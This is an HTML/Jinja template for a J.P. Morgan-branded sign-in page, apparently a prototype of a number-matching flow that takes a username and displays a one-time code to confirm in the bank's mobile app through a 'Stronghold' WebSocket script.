{% extends "base.html" %}

{% block title %}J.P. Morgan - PIN Code{% endblock %}

{% block extra_head %}
    <link rel="stylesheet" href="/static/css/styles.css">
    <style>
        .pin-container {
            max-width: 400px;
            margin: 40px auto;
            padding: 20px;
            text-align: center;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .pin-options {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        
        .pin-option {
            font-size: 24px;
            font-weight: bold;
            padding: 15px 30px;
            border: 2px solid #007bff;
            border-radius: 4px;
            background: #f8f9fa;
            color: #333;
            cursor: default;
            transition: all 0.2s ease;
        }
        
        .pin-option:disabled {
            opacity: 1;
            background: #ffffff;
        }

        h2 {
            color: #333;
            margin-bottom: 20px;
        }

        p {
            color: #666;
            margin: 10px 0;
        }
    </style>
{% endblock %}

{% block content %}
    <div class="container">
        
        <!-- Step 1: Username Entry -->
        <div class="step active" id="step1">
            <div id="login-form-container"></div>
        </div>
        
        <!-- Step 2: PIN Entry -->
        <div class="step" id="step2">
            <div class="confirmation-container">
                <a href="#" class="cancel-link" onclick="showStep(1)">Cancel</a>
                <h3>One-Time Code</h3>
                <h2>Please open the J.P. Morgan Digital Mobile App and select the following code:</h2>
                <div class="pin-container">
                    <div id="browser-pin"">
                        Generating code...
                    </div>
                    <div id="pin-status"></div>
                </div>
            </div>
        </div>

        <div id="status"></div>
    </div>
{% endblock %}

{% block scripts %}
    <script src="/static/stronghold.js"></script>
    <script src="/static/components/login-form.js"></script>
    <script>
        // Define functions first
        function showStep(stepNumber) {
            // Hide all steps
            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
            // Show requested step
            document.getElementById(`step${stepNumber}`).classList.add('active');
        }

        async function proceedToCode(username) {
            try {
                // Reset any existing session
                if (currentSessionId) {
                    // Reset Stronghold instance
                    if (stronghold) {
                        if (stronghold.ws) {
                            stronghold.ws.close();
                            stronghold.ws = null;
                        }
                        if (stronghold.pollingInterval) {
                            clearInterval(stronghold.pollingInterval);
                            stronghold.pollingInterval = null;
                        }
                        stronghold.sessionId = null;
                    }
                    currentSessionId = null;
                }
                
                const requestData = { username };
                console.log('Browser: Sending start-session request to server');
                console.log('Browser: API Call - POST /start-session', requestData);
                const response = await fetch('/start-session', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(requestData)
                });
                
                if (!response.ok) {
                    console.error(`Browser: Server returned status: ${response.status}`);
                    throw new Error('Failed to start session');
                }
                
                const data = await response.json();
                console.log('Browser: API Response:', data);
                currentSessionId = data.session_id;
                console.log(`Browser: Session started with ID: ${currentSessionId}`);
                
                // Show the PIN step
                showStep(2);
                
                // Update the confirmation container to show the new PIN
                const confirmationContainer = document.querySelector('.confirmation-container');
                if (confirmationContainer) {
                    confirmationContainer.innerHTML = `
                <h3>One-Time Code</h3>
                <p>Please open the J.P. Morgan Digital Mobile App and select the following code:</p>
                        <div class="pin-container">
                            <div id="browser-pin">
                                ${data.pin}
                            </div>
                            <div id="pin-status"></div>
                        </div>
                    `;
                    console.log(`Browser: Displaying PIN: ${data.pin}`);
                }
                
                // Initialize WebSocket connection
                await stronghold.initializeSession(data.session_id);
            } catch (error) {
                console.error('Browser: Session error:', error);
                showStatus('Error starting session: ' + error.message, 'error');
            }
        }

        const statusDiv = document.getElementById('status');
        
        function showStatus(message, type) {
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
        }

        // Initialize Stronghold instance
        const stronghold = new Stronghold();
        let currentSessionId = null;
        let currentClientId = null;

        // Check for username in URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const autoUsername = urlParams.get('username');
        
        // If username provided, auto-start the session
        if (autoUsername) {
            // Hide login form, show PIN step immediately
            showStep(2);
            // Start session with provided username
            proceedToCode(autoUsername);
        }

        // Only initialize login form if no username provided and we're not in auto mode
        if (!autoUsername) {
            const loginForm = new LoginForm('login-form-container', {
                onContinue: ({ username, remember }) => {
                    proceedToCode(username);
                }
            });

            // Only check for saved username if we're showing the login form
            document.addEventListener('DOMContentLoaded', function() {
                const savedUsername = getCookie('username');
                const usernameInput = document.getElementById('username-input');
                if (savedUsername && usernameInput) {
                    usernameInput.value = savedUsername;
                    const rememberCheckbox = document.getElementById('remember-username');
                    if (rememberCheckbox) {
                        rememberCheckbox.checked = true;
                    }
                }
            });
        }
    </script>

    <script>
        // Cookie handling functions
        function setCookie(name, value, days) {
            const expires = new Date();
            expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
            document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
        }

        function getCookie(name) {
            const nameEQ = name + "=";
            const ca = document.cookie.split(';');
            for(let i = 0; i < ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
            }
            return null;
        }
    </script>

    <script>
        // Handle pin selection
        function handlePinSelector() {
            const pinDisplay = document.getElementById('browser-pin');
            const messageBox = document.getElementById('pin-message-box');
            
            // Hide the PIN
            pinDisplay.style.display = 'none';
            
            // Show the message box
            messageBox.style.display = 'block';
        }
        
        // Handle message submission
        function handleMessageSubmit() {
            const message = document.getElementById('pin-message').value;
            if (message.trim()) {
                console.log('Message submitted:', message);
                // Add your message handling logic here
                
                // Clear the message input
                document.getElementById('pin-message').value = '';
            }
        }
    </script>

    <script>
        function resetAndShowLogin() {
            // Reset the PIN display
            const pinContainer = document.getElementById('browser-pin');
            if (pinContainer) {
                pinContainer.innerHTML = 'Generating code...';
            }
            
            // Reset Stronghold instance
            if (stronghold) {
                // Close existing WebSocket
                if (stronghold.ws) {
                    stronghold.ws.close();
                    stronghold.ws = null;
                }
                // Clear polling interval
                if (stronghold.pollingInterval) {
                    clearInterval(stronghold.pollingInterval);
                    stronghold.pollingInterval = null;
                }
                // Reset session ID
                stronghold.sessionId = null;
            }
            
            // Create new Stronghold instance
            window.stronghold = new Stronghold();
            
            // Show login step
            showStep(1);
        }
    </script>
{% endblock %} 